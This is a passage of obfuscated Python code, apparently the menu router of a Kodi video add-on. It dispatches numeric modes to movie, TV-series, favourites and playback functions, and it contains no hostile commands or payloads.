elif OOoOoo00Oo == 7052 :
 IIii1i ( I1i11i )
 if 40 - 40: II1i1IiiIIi11
elif OOoOoo00Oo == 7053 :
 o00oo ( I1i11i )
 if 62 - 62: oOO / i11i1
elif OOoOoo00Oo == 7054 :
 CoolPlay ( I1i11i )
 if 74 - 74: II1i1IiiIIi11 % I1I1ii / I1I1ii - iIii1I11I1II1 - OoOoOO00 + i11i1
elif OOoOoo00Oo == 7060 :
 Ii1111iiI ( )
 if 92 - 92: OOoo0OO0 % I1I1ii
elif OOoOoo00Oo == 7061 :
 oOOO0o ( I1i11i )
 if 18 - 18: oOO + I1I1ii / i11i1 / Ooo0OO0oOO + iIii1I11I1II1 % iI1Ii11iII1
elif OOoOoo00Oo == 7063 :
 I1Io0oO0oo ( I1i11i )
 if 94 - 94: OOoo0OO0
elif OOoOoo00Oo == 7062 :
 ii11Ii1IiiI1 ( I1i11i )
 if 37 - 37: Ooo0OO0oOO
elif OOoOoo00Oo == 7064 :
 NATatozcat ( )
 if 52 - 52: ii11ii1ii * OOOo0 . i11i1 + i1IIi % Ooo0OO0oOO / iIii1I11I1II1
elif OOoOoo00Oo == 7067 :
 OoO0o0OO ( I1i11i )
 if 68 - 68: I1I1ii - I1IiI . i11iIiiIii + OOooOOo
elif OOoOoo00Oo == 7066 :
 NATatozA ( I1i11i )
 if 71 - 71: i11iIiiIii / i1IIi * OOOo0 / I1IiI
elif OOoOoo00Oo == 7065 :
 II11IiI1 ( I1i11i )
 if 33 - 33: OOoo0OO0 . Oo
elif OOoOoo00Oo == 7070 :
 oo0O0oOOO0o ( )
 if 89 - 89: II1i1IiiIIi11 + i1IIi - iI1Ii11iII1 + oOO . OoOoOO00
elif OOoOoo00Oo == 7071 :
 DIZIlist ( I1i11i )
 if 85 - 85: iIii1I11I1II1 - oO0O * Oo . Ooo0OO0oOO + I1I1ii
elif OOoOoo00Oo == 7072 :
 DIZIpull ( I1i11i )
 if 13 - 13: O0 + iIii1I11I1II1 % OoOoOO00 + iIii1I11I1II1
elif OOoOoo00Oo == 7073 :
 WATCHDIZI ( I1i11i )
 if 85 - 85: OOOo0 * iIii1I11I1II1 . II1i1IiiIIi11 / II1i1IiiIIi11
elif OOoOoo00Oo == 7002 :
 Ii11I ( )
 if 43 - 43: OOOo0
elif OOoOoo00Oo == 7003 :
 O0o0oo0O ( I1i11i )
 if 78 - 78: Ooo00oOo00o % OoOoOO00 + I1IiI / OOOo0
elif OOoOoo00Oo == 7004 :
 I11i1I11 ( I1i11i )
 if 34 - 34: OOooOOo % ii11ii1ii + oO0O * OOoo0OO0 / Ooo0OO0oOO
elif OOoOoo00Oo == 7020 :
 oOiiIIIII ( I1i11i )
 if 18 - 18: oOO
elif OOoOoo00Oo == 7001 :
 I1iIIi ( )
 if 92 - 92: Ooo00oOo00o % iIii1I11I1II1 / iI1Ii11iII1 * II1i1IiiIIi11 . i1IIi + Ooo0OO0oOO
elif OOoOoo00Oo == 7010 :
 oOoOO0O00o ( I1i11i )
 if 24 - 24: iI1Ii11iII1 . II1i1IiiIIi11 * iI1Ii11iII1 % i11iIiiIii . i11iIiiIii + i1IIi
elif OOoOoo00Oo == 7011 :
 iIIIi1iii1I11 ( I1i11i )
 if 64 - 64: iIii1I11I1II1 / iI1Ii11iII1 / Oo - ii11ii1ii
elif OOoOoo00Oo == 7012 :
 Oo0O0OooOooo0 ( I1i11i )
 if 100 - 100: iI1Ii11iII1 + i1IIi * Ooo00oOo00o
elif OOoOoo00Oo == 7013 :
 cnfTVPlay2 ( I1i11i )
elif OOoOoo00Oo == 7014 :
 CNF_Studio_Indexer . MV_Movies ( I1i11i )
elif OOoOoo00Oo == 7015 :
 CNF_Studio_Indexer . Movie_ByYear ( I1i11i )
elif OOoOoo00Oo == 7016 :
 CNF_Studio_Indexer . Resolve_CNF_Link ( OO0ooOOO0OOO , I1i11i , IiI )
elif OOoOoo00Oo == 7017 :
 CNF_Studio_Indexer . Search_Movie ( )
elif OOoOoo00Oo == 7018 :
 O0OOOOoO00oo ( )
elif OOoOoo00Oo == 7019 :
 CNF_Studio_Indexer . List_Movies ( I1i11i )
elif OOoOoo00Oo == 7020 :
 CNF_Studio_Indexer . Get_Movie_Page ( I1i11i )
elif OOoOoo00Oo == 7024 :
 CNF_Studio_Indexer . Box_Office ( I1i11i )
 if 64 - 64: Ooo0OO0oOO * i11iIiiIii . Oo
elif OOoOoo00Oo == 8000 :
 Oo0O0O ( )
elif OOoOoo00Oo == 8001 :
 OoOooO ( )
elif OOoOoo00Oo == 8002 :
 oOoo0OO0 ( )
elif OOoOoo00Oo == 8003 :
 ii1iIII1ii ( )
elif OOoOoo00Oo == 8004 :
 I11IiI1i ( )
elif OOoOoo00Oo == 8005 :
 oo0OooO ( )
elif OOoOoo00Oo == 8006 :
 OO0o0o0oo ( OO0ooOOO0OOO , I1i11i )
elif OOoOoo00Oo == 8030 :
 OOO0oOOo00O ( I1i11i )
elif OOoOoo00Oo == 8045 :
 I1i ( I1i11i )
elif OOoOoo00Oo == 8046 :
 I11I ( I1i11i )
elif OOoOoo00Oo == 8047 :
 iii ( I1i11i )
elif OOoOoo00Oo == 8020 :
 oOOo00ooO ( )
elif OOoOoo00Oo == 8021 :
 ooOo ( I1i11i )
elif OOoOoo00Oo == 8022 :
 OOOoOo0oO0OoO ( I1i11i )
elif OOoOoo00Oo == 8023 :
 I1ii11 ( I1i11i )
elif OOoOoo00Oo == 8040 :
 IiiIii1ii1I ( )
elif OOoOoo00Oo == 8041 :
 IiiIII ( I1i11i )
elif OOoOoo00Oo == 8042 :
 ii1I11II1 ( I1i11i )
elif OOoOoo00Oo == 8043 :
 yt . PlayVideo ( I1i11i )
elif OOoOoo00Oo == 8044 :
 i1i1i1IOOOOOo ( I1i11i )
elif OOoOoo00Oo == 8060 :
 Ii1iiI1 ( )
elif OOoOoo00Oo == 8061 :
 o0ooOOoO0oO0 ( I1i11i )
elif OOoOoo00Oo == 8064 :
 OOoO0OOoO0ooo ( )
elif OOoOoo00Oo == 8065 :
 ii11i1ii1 ( I1i11i )
elif OOoOoo00Oo == 8070 :
 iI1i ( )
elif OOoOoo00Oo == 8071 :
 i11I ( I1i11i )
elif OOoOoo00Oo == 7080 :
 o0oO0o0oo0O0 ( I1i11i )
elif OOoOoo00Oo == 8090 :
 oo00ooooOOo00 ( )
elif OOoOoo00Oo == 8091 :
 ii1iOO00Oooo000 ( I1i11i )
elif OOoOoo00Oo == 8092 :
 iI1ii111iiIii ( I1i11i )
elif OOoOoo00Oo == 8081 :
 o00OoO ( )
elif OOoOoo00Oo == 8062 :
 OooO00oo0O0 ( I1i11i )
elif OOoOoo00Oo == 8063 :
 iIi1iiI1i1 ( I1i11i )
elif OOoOoo00Oo == 8050 :
 OO00O000OOO ( )
elif OOoOoo00Oo == 8051 :
 iIOo0O ( I1i11i )
elif OOoOoo00Oo == 8052 :
 Ii11 ( I1i11i )
elif OOoOoo00Oo == 8085 :
 IiI11I111 ( )
elif OOoOoo00Oo == 8086 :
 Iiii1Ii ( I1i11i )
elif OOoOoo00Oo == 8087 :
 i1ii1I1IIIII ( I1i11i )
elif OOoOoo00Oo == 8088 :
 OoiiI1i111 ( I1i11i , OO0ooOOO0OOO )
elif OOoOoo00Oo == 9000 :
 OOoO0 ( )
elif OOoOoo00Oo == 1111 :
 oOOOo ( )
elif OOoOoo00Oo == 9001 :
 oOoOO0000oO00 ( )
elif OOoOoo00Oo == 9002 :
 o0OO0OO000OO ( )
elif OOoOoo00Oo == 9003 :
 O00oo0o0ooOo00 ( )
elif OOoOoo00Oo == 50 :
 iI111i1I1II ( I1i11i )
elif OOoOoo00Oo == 9020 :
 champlist ( )
elif OOoOoo00Oo == 9021 :
 iiiIIiii11I1 ( )
elif OOoOoo00Oo == 9022 :
 oo0O ( )
elif OOoOoo00Oo == 9023 :
 Ooooo0O0 ( )
elif OOoOoo00Oo == 9024 :
 I111Ii11i11I ( I1i11i )
elif OOoOoo00Oo == 9030 :
 OooOoo ( I1i11i )
elif OOoOoo00Oo == 9031 :
 Oooo0Oo00o ( I1i11i )
elif OOoOoo00Oo == 9032 :
 IIoO ( I1i11i )
elif OOoOoo00Oo == 9033 :
 iI1I ( I1i11i )
elif OOoOoo00Oo == 7085 :
 iiiIIiiIi ( I1i11i )
elif OOoOoo00Oo == 7086 :
 iI1II1i ( I1i11i )
elif OOoOoo00Oo == 7087 :
 IIIIIiI1I1 ( o0OoOO )
elif OOoOoo00Oo == 9666 :
 oO0OOOO00o ( I1i11i )
elif OOoOoo00Oo == 10100 : iiI1ii111 ( )
elif OOoOoo00Oo == 10105 : I1111ii11IIII ( I1i11i )
elif OOoOoo00Oo == 10106 : iI1Iii11i1 ( I1i11i )
elif OOoOoo00Oo == 10104 : iIIIII1iI ( I1i11i )
elif OOoOoo00Oo == 10107 : IiIIii1iiI ( )
elif OOoOoo00Oo == 10103 : i1IiI1Iiii ( I1i11i )
elif OOoOoo00Oo == 10108 : I11II1i1 ( I1i11i )
elif OOoOoo00Oo == 10107 : IiIIii1iiI ( )
elif OOoOoo00Oo == 10000 : Origin_Menu ( )
elif OOoOoo00Oo == 10001 : iIi1I1 ( )
elif OOoOoo00Oo == 10002 : iII1i1IIiI1I ( )
elif OOoOoo00Oo == 10003 : ooOoOO ( )
elif OOoOoo00Oo == 10004 : o0oo0000 ( I1i11i )
elif OOoOoo00Oo == 10005 : i11i1Ii1 ( )
elif OOoOoo00Oo == 10006 : o0Oo ( I1i11i )
elif OOoOoo00Oo == 10007 : O0OO0o0OO0OO ( I1i11i , IiI )
elif OOoOoo00Oo == 10008 : o0iIIIIi ( )
elif OOoOoo00Oo == 10009 : iIII11Iiii1 ( )
elif OOoOoo00Oo == 10010 : o0OoO0OOoO0Oo0 ( I1i11i )
elif OOoOoo00Oo == 10011 : IiiI11I1IIiI ( I1i11i )
elif OOoOoo00Oo == 10012 : o00OOo ( I1i11i )
elif OOoOoo00Oo == 10013 : oOoO0OOO00O ( I1i11i )
elif OOoOoo00Oo == 10014 : I1III1II1I11 ( )
elif OOoOoo00Oo == 10015 : O000oOo ( )
elif OOoOoo00Oo == 10016 : i11IiIIi11I ( I1i11i )
elif OOoOoo00Oo == 10017 : oO0ooOOiii1iII1 ( )
elif OOoOoo00Oo == 10018 : oO00 ( )
elif OOoOoo00Oo == 10019 : oOooo00O ( )
elif OOoOoo00Oo == 10020 : Oo0O ( )
elif OOoOoo00Oo == 10021 : ooooo0O0 ( )
elif OOoOoo00Oo == 10022 : OooooOo0 ( I1i11i )
elif OOoOoo00Oo == 10023 : Ii1 ( OO0ooOOO0OOO , I1i11i )
elif OOoOoo00Oo == 10024 : I1III1iIi ( I1i11i )
elif OOoOoo00Oo == 10025 : iIIiI1iiI ( )
elif OOoOoo00Oo == 10026 : i1iI1IIIII1 ( )
elif OOoOoo00Oo == 10027 : oo0OOOOO0 ( )
elif OOoOoo00Oo == 10028 : OOOOI1iI1i11 ( )
elif OOoOoo00Oo == 10029 : OOOo ( )
elif OOoOoo00Oo == 423 : o00ooOoO0 ( I1i11i )
elif OOoOoo00Oo == 426 : III1Ii1i1I1 ( I1i11i )
elif OOoOoo00Oo == 10030 : Izle_Films ( )
elif OOoOoo00Oo == 10031 : Latest_Izle_Movies ( )
elif OOoOoo00Oo == 10032 : Izle_Genres ( )
elif OOoOoo00Oo == 10033 : Izle_Pop_Movies ( )
elif OOoOoo00Oo == 10034 : Izle_Boxsets ( )
elif OOoOoo00Oo == 10035 : Izle_Search ( )
elif OOoOoo00Oo == 10036 : Izle_Genres_Movie ( I1i11i )
elif OOoOoo00Oo == 10037 : Izle_Boxset_single ( I1i11i )
elif OOoOoo00Oo == 10038 : Izle_IFRAME ( )
elif OOoOoo00Oo == 10039 : Izle_Boxsets_Next ( I1i11i )
elif OOoOoo00Oo == 10040 : I1Iii1Ii1i1 ( )
elif OOoOoo00Oo == 10041 : i11i11II11i ( I1i11i )
elif OOoOoo00Oo == 10042 : i111i1I1ii1i ( I1i11i )
elif OOoOoo00Oo == 10043 : II1Iiii11111 ( )
elif OOoOoo00Oo == 10044 : OOooOooo0OOo0 ( I1i11i )
elif OOoOoo00Oo == 10045 : III1III11II ( OO0ooOOO0OOO )
elif OOoOoo00Oo == 10046 : o0o ( I1i11i )
elif OOoOoo00Oo == 10047 : OoOOoooO000 ( I1i11i )
elif OOoOoo00Oo == 10048 : i11i11II11i1 ( I1i11i )
elif OOoOoo00Oo == 10049 : I1I1i1i ( I1i11i )
elif OOoOoo00Oo == 10050 : iIIi1 ( )
elif OOoOoo00Oo == 10051 : iIiiIiIIiI ( )
elif OOoOoo00Oo == 10052 : o0000oO ( )
elif OOoOoo00Oo == 10053 : Addon ( I1i11i )
elif OOoOoo00Oo == 10054 : IIiII ( I1i11i , OO0ooOOO0OOO )
elif OOoOoo00Oo == 10055 :
 oo0O0o ( "addFavorite" )
 try :
  OO0ooOOO0OOO = OO0ooOOO0OOO . split ( '\\ ' ) [ 1 ]
 except :
  pass
 try :
  OO0ooOOO0OOO = OO0ooOOO0OOO . split ( '  - ' ) [ 0 ]
 except :
  pass
 O00o ( OO0ooOOO0OOO , I1i11i , IiI , iI1ii1i , I1I11i )
elif OOoOoo00Oo == 10056 :
 oo0O0o ( "rmFavorite" )
 try :
  OO0ooOOO0OOO = OO0ooOOO0OOO . split ( '\\ ' ) [ 1 ]
 except :
  pass
 try :
  OO0ooOOO0OOO = OO0ooOOO0OOO . split ( '  - ' ) [ 0 ]
 except :
  pass
 ii11i11 ( OO0ooOOO0OOO )
elif OOoOoo00Oo == 10057 :
 oo0O0o ( "getFavorites" )
 I1iIIIiIi1 ( )
elif OOoOoo00Oo == 10058 : O0O0Ooo ( )
elif OOoOoo00Oo == 10059 : Donators_Guide ( )
elif OOoOoo00Oo == 10060 : OooO0oo ( )
elif OOoOoo00Oo == 10061 : OoO ( )
elif OOoOoo00Oo == 10062 : o0o0O00oo0 ( OO0ooOOO0OOO , I1i11i , o0OoOO )
elif OOoOoo00Oo == 10063 : IiIi1I1ii111 ( )
elif OOoOoo00Oo == 10064 : ooOOoO ( )
elif OOoOoo00Oo == 10065 : iiI1I1 ( I1i11i )
elif OOoOoo00Oo == 10066 : oo00O00Oo ( I1i11i )
elif OOoOoo00Oo == 10068 : o0Oooo ( I1i11i )
elif OOoOoo00Oo == 10069 : OOo ( I1i11i )
elif OOoOoo00Oo == 10070 : iI1II ( I1i11i )
elif OOoOoo00Oo == 10071 : Genie_Watch ( )
elif OOoOoo00Oo == 10072 : Oo0OO ( )
elif OOoOoo00Oo == 10073 : I1II1 ( I1i11i )
elif OOoOoo00Oo == 10074 : oo00OO0000oO ( I1i11i )
elif OOoOoo00Oo == 10075 : Ii1iI111II1I1 ( IiI , OO0ooOOO0OOO , I1i11i )
elif OOoOoo00Oo == 10076 : IiI1iiiIii ( I1i11i )
elif OOoOoo00Oo == 10077 : i1i1iI1iiiI ( I1i11i )
elif OOoOoo00Oo == 10078 : iiI11ii1I1 ( )
elif OOoOoo00Oo == 10079 : Genie_Watch_Tv_Shows ( )
elif OOoOoo00Oo == 10080 : Genie_Watch_Tv_Genre ( I1i11i )
elif OOoOoo00Oo == 10081 : Genie_Watch_TV_PlayRun ( I1i11i )
elif OOoOoo00Oo == 10082 : Genie_Watch_TV_Episodes ( I1i11i , IiI )
elif OOoOoo00Oo == 10083 : Genie_Watch_Tv_Recent ( I1i11i )
elif OOoOoo00Oo == 10084 : o0Ooo00o0Oooo ( )
elif OOoOoo00Oo == 10085 : oO0OOoo0OO ( )
elif OOoOoo00Oo == 10086 : III1iII1I1ii ( )
elif OOoOoo00Oo == 20000 : iiIIi1 ( )
elif OOoOoo00Oo == 20001 : O0Oo0Ooo ( )
elif OOoOoo00Oo == 20002 : O0iI ( I1i11i )
elif OOoOoo00Oo == 20003 : iiiIiI ( I1i11i )
elif OOoOoo00Oo == 20004 : iIii1Ooo0oO0 ( I1i11i )
elif OOoOoo00Oo == 21004 : IIiooOoO0OO0oOO ( )
elif OOoOoo00Oo == 21005 : II1i ( I1i11i )
elif OOoOoo00Oo == 21006 : i1i1IiIiIi1Ii ( I1i11i )
elif OOoOoo00Oo == 21007 : OO0ooo0o0 ( I1i11i )
elif OOoOoo00Oo == 30000 : III1IiIII1 ( )
elif OOoOoo00Oo == 30001 : oOo0O0O0 ( )
elif OOoOoo00Oo == 10012 : Resolve ( I1i11i )
elif OOoOoo00Oo == 30003 : ii1IiIi11 ( )
elif OOoOoo00Oo == 30004 : IiiiI1 ( I1i11i )
elif OOoOoo00Oo == 30005 : OOo0Oo0OOo0 ( I1i11i )
elif OOoOoo00Oo == 30006 : IIIIIiII1 ( )
elif OOoOoo00Oo == 30007 : i1oO ( )
elif OOoOoo00Oo == 30008 : o0O0ooOOoO ( I1i11i )
elif OOoOoo00Oo == 30009 : II1II ( I1i11i )
elif OOoOoo00Oo == 30010 : o0oooO ( I1i11i )
elif OOoOoo00Oo == 30011 : O0ooOoO ( )
elif OOoOoo00Oo == 30012 : IiiIi ( )
elif OOoOoo00Oo == 30013 : i1I11iIII1i1I ( )
elif OOoOoo00Oo == 30014 : oOOII1i11i1iIi11 ( )
if 52 - 52: Oo / oOO / II1i1IiiIIi11 - OOooOOo / II1i1IiiIIi11
xbmcplugin . endOfDirectory ( int ( sys . argv [ 1 ] ) )
# dd678faae9ac167bc83abf78e5cb2f3f0688d3a3
